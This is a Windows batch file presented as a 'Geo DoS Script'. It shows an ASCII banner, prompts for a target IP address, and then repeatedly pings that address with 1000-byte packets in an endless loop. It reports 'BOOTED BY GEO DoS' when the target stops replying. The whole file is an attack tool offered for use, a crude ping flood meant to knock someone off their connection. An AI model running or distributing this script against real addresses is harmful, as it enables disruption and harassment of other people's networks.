@echo off
title Geo DoS Script
chcp 65001
mode 54,12
cls
echo   ▄████ ▓█████  ▒█████     ▓█████▄  ▒█████    ██████ 
echo  ██▒ ▀█▒▓█   ▀ ▒██▒  ██▒   ▒██▀ ██▌▒██▒  ██▒▒██    ▒ 
echo ▒██░▄▄▄░▒███   ▒██░  ██▒   ░██   █▌▒██░  ██▒░ ▓██▄   
echo ░▓█  ██▓▒▓█  ▄ ▒██   ██░   ░▓█▄   ▌▒██   ██░  ▒   ██▒
echo ░▒▓███▀▒░▒████▒░ ████▓▒░   ░▒████▓ ░ ████▓▒░▒██████▒▒
echo  ░▒   ▒ ░░ ▒░ ░░ ▒░▒░▒░     ▒▒▓  ▒ ░ ▒░▒░▒░ ▒ ▒▓▒ ▒ ░
echo  ░   ░  ░ ░  ░  ░ ▒ ▒░     ░ ▒  ▒   ░ ▒ ▒░ ░ ░▒  ░ ░
echo ░ ░   ░    ░   ░ ░ ░ ▒      ░ ░  ░ ░ ░ ░ ▒  ░  ░  ░  
echo      ░    ░  ░    ░ ░        ░        ░ ░        ░  
echo                                ░                        
set /p IP=Enter IP To Ping:
:top
PING -n 1 -l 1000 %IP% | FIND "TTL="
title ::DoSing %IP%::
IF ERRORLEVEL 1 (echo BOOTED BY GEO DoS)
set /a num=(%Random%%%9)+1
color %num%
ping -t 2 0 10 127.0.0.1 >nul
GoTo top